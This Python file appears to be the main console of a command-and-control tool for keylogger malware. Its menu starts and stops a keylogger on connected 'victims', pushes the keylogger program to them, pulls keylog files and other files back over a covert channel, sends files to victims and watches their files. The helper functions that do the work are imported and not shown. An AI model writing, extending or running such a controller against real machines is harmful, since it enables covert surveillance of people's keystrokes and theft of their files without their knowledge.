import select
from commander_utils import *

if __name__ == '__main__':
    # Initialization + GetOpts
    source_ip, source_port, destination_ip, destination_port = parse_arguments()

    # Initialize server socket and socket lists
    server_socket = initialize_server_socket(source_ip, source_port)

    # List of sockets to monitor for readability (includes the server and stdin FDs)
    sockets_to_read = [server_socket, sys.stdin]

    # Initialize client list to keep track of connected client sockets and their addresses (IP, Port)
    # Key/Value Pair => [Socket] : (IP, Port)
    connected_clients = {}

    # Initial connect to victim as passed by argument (and put in sockets_to_read)
    print_config(destination_ip, destination_port, (source_ip, source_port))
    victim_socket = initial_connect_to_client(sockets_to_read, connected_clients, destination_ip,
                                              destination_port)

    # Initialize a Global Thread and Queue (for multipurpose)
    global_thread = None
    signal_queue = queue.Queue()

    # Display Menu
    display_menu()

    while True:
        # Use select to monitor multiple sockets
        readable, _, _ = select.select(sockets_to_read, [], [])

        for sock in readable:
            # a) Handle new connections
            if sock is server_socket:
                # This means there is a new incoming connection
                process_new_connections(server_socket, sockets_to_read, connected_clients)

            # b) Read from stdin file descriptor (Initiate Menu from keystroke)
            elif sock is sys.stdin:
                command = get_user_menu_option(sys.stdin)

                # MENU ITEM 1 - Start Keylogger
                if command == constants.PERFORM_MENU_ITEM_ONE:
                    perform_menu_item_1(connected_clients)

                # MENU ITEM 2 - Stop Keylogger
                if command == constants.PERFORM_MENU_ITEM_TWO:
                    perform_menu_item_2(connected_clients)

                # MENU ITEM 3 - Transfer keylog program to victim
                if command == constants.PERFORM_MENU_ITEM_THREE:
                    perform_menu_item_3(connected_clients)

                # MENU ITEM 4 - Get Keylog File(s) from Victim (via. covert channel)
                if command == constants.PERFORM_MENU_ITEM_FOUR:
                    perform_menu_item_4(connected_clients, source_ip, source_port)

                # MENU ITEM 5 - Disconnect from victim
                if command == constants.PERFORM_MENU_ITEM_FIVE:
                    disconnect_from_client(sockets_to_read, connected_clients)

# MENU ITEM 6 - Transfer a file to victim
                if command == constants.PERFORM_MENU_ITEM_SIX:
                    # CASE 1: Check if client list is empty
                    if len(connected_clients) == constants.ZERO:
                        print(constants.TRANSFER_FILE_NO_CLIENT_ERROR)

                    # CASE 2: Send file to a single client in client list
                    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
                        client_socket, (client_ip, client_port, status, status_2) = next(iter(connected_clients.items()))

                        # Check status
                        if is_keylogging(status, client_ip, client_port, constants.FILE_TRANSFER_KEYLOG_ERROR):
                            print(constants.RETURN_MAIN_MENU_MSG)
                            print(constants.MENU_CLOSING_BANNER)
                            break
                            # return None
                        elif is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
                            print(constants.RETURN_MAIN_MENU_MSG)
                            print(constants.MENU_CLOSING_BANNER)
                            break
                            # return None
                        else:
                            choices = protocol_and_field_selector()
                            transfer_file_covert(client_socket, client_ip, client_port,
                                                 source_ip, source_port, choices)

                    # CASE 3: Send file to any specific connected victim
                    elif len(connected_clients) != constants.ZERO:
                        target_ip = input(constants.TRANSFER_FILE_ENTER_TARGET_IP_FIND_PROMPT)
                        target_port = int(input(constants.TRANSFER_FILE_ENTER_TARGET_PORT_FIND_PROMPT))
                        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(
                            connected_clients,
                            target_ip,
                            target_port)

                        # Check status
                        if is_keylogging(status, target_ip, target_port, constants.FILE_TRANSFER_KEYLOG_ERROR):
                            print(constants.RETURN_MAIN_MENU_MSG)
                            print(constants.MENU_CLOSING_BANNER)
                            pass
                            # return None
                        elif is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
                            print(constants.RETURN_MAIN_MENU_MSG)
                            print(constants.MENU_CLOSING_BANNER)
                            pass
                            # return None
                        elif target_socket:
                            choices = protocol_and_field_selector()
                            transfer_file_covert(target_socket, target_ip, target_port,
                                                 source_ip, source_port, choices)
                        else:
                            print(constants.TARGET_VICTIM_NOT_FOUND)
                            print(constants.RETURN_MAIN_MENU_MSG)
                            print(constants.MENU_CLOSING_BANNER)

# MENU ITEM 7 - Get File from Victim
                if command == constants.PERFORM_MENU_ITEM_SEVEN:
                    # CASE 1: Check if client list is empty
                    if len(connected_clients) == constants.ZERO:
                        print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)

                    # CASE 2: Handle single client in client list
                    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
                        client_socket, (client_ip, client_port, status, status_2) = next(iter(connected_clients.items()))

                        # Check status
                        if is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
                            print(constants.RETURN_MAIN_MENU_MSG)
                            print(constants.MENU_CLOSING_BANNER)
                            pass
                            # return None
                        elif is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
                            print(constants.RETURN_MAIN_MENU_MSG)
                            print(constants.MENU_CLOSING_BANNER)
                            pass
                            # return None
                        else:
                            choices = protocol_and_field_selector()  # => For covert channel
                            receive_file_covert(client_socket, client_ip, client_port,
                                                source_ip, source_port, choices)

                    # CASE 3: Send keylogger to any specific connected victim
                    elif len(connected_clients) != constants.ZERO:
                        target_ip = input(constants.TRANSFER_FILE_ENTER_TARGET_IP_FIND_PROMPT)
                        target_port = int(input(constants.TRANSFER_FILE_ENTER_TARGET_PORT_FIND_PROMPT))
                        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(
                            connected_clients,
                            target_ip,
                            target_port)

                        # Check status
                        if is_keylogging(status, target_ip, target_port, constants.FILE_TRANSFER_KEYLOG_ERROR):
                            print(constants.RETURN_MAIN_MENU_MSG)
                            print(constants.MENU_CLOSING_BANNER)
                            pass
                            # return None
                        elif is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
                            print(constants.RETURN_MAIN_MENU_MSG)
                            print(constants.MENU_CLOSING_BANNER)
                            pass
                            # return None
                        elif target_socket:
                            choices = protocol_and_field_selector()  # => For covert channel
                            receive_file_covert(target_socket, target_ip, target_port,
                                                source_ip, source_port, choices)
                        else:
                            print(constants.TARGET_VICTIM_NOT_FOUND)
                            print(constants.RETURN_MAIN_MENU_MSG)
                            print(constants.MENU_CLOSING_BANNER)

# MENU ITEM 9 - Watch File (BUG: Files that are nested and in sub-directories)
                if command == constants.PERFORM_MENU_ITEM_NINE:
                    global_thread = perform_menu_item_9(connected_clients, global_thread, signal_queue)

# MENU ITEM 10 - Watch Directory [PENDING IMPLEMENTATION]
                # 1) If the file is ADDED (in directories), store it in the
                #    ip-based directory of commander

                # MENU ITEM 11 - Stop Watching File
                if command == constants.PERFORM_MENU_ITEM_ELEVEN:
                    global_thread = perform_menu_item_11(connected_clients, global_thread, signal_queue)

                # MENU ITEM 12 - Connect to a specific victim
                if command == constants.PERFORM_MENU_ITEM_FOURTEEN:
                    _, target_socket, target_ip, target_port = connect_to_client_with_prompt(sockets_to_read,
                                                                                             connected_clients)
